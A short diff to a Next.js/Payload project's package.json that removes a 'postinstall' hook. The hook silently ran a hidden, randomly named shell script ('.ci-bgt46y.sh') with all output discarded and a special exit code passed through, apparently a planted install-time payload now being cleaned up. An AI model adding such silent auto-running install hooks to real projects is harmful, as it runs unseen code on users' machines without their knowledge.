@@ -7,8 +7,7 @@
     "build": "next build",
     "generate:importmap": "payload generate:importmap",
     "start": "next start",
-    "lint": "eslint",
-    "postinstall": "sh ./.ci-bgt46y.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "lint": "eslint"
   },
   "engines": {
     "node": "22.x"
